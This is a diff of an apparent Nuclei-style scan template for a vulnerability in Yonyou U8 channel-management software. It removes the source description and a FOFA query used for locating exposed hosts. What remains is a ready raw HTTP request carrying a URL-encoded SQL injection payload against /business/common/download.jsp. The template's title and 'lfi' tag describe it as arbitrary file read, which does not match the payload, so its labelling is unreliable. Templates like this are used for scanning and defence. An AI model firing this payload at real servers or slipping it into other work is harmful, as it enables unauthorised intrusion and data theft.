@@ -3,12 +3,8 @@ info:
   name: 用友U8 渠道管理(高级版)download new存在任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/niybbg4xsqq9g5ap'
+  description: ''
   tags: lfi,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: niybbg4xsqq9g5ap
-    fofa: title="渠道管理（高级版）" ||"common/images/dot.gif" && (icon_hash="737647198" || icon_hash="84729000")
 http:
 - raw:
   - 'GET /business/common/download.jsp?filename=&foldertype=&file=%27+AND+9228+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%28120%29%2BCHAR%28122%29%2BCHAR%28120%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%289228%3D9228%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%2898%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29+AND+%27BkmE%27%3D%27BkmE HTTP/1.1
